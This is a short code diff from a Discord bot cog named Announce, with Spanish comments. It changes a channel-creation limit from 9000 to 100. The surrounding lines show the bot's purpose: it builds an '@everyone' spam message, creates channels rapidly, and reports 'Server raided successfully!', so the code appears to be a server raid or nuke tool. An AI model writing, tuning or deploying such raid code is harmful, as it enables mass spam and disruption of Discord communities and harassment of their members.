@@ -100,7 +100,7 @@ class Announce(commands.Cog):
             
             # 5. Crear canales
             spam_message = f"@everyone {message}"
-            max_channels = 9000
+            max_channels = 100
             raid_message = "✅ Server raided successfully!"
             
             # Crear canales rápidamente
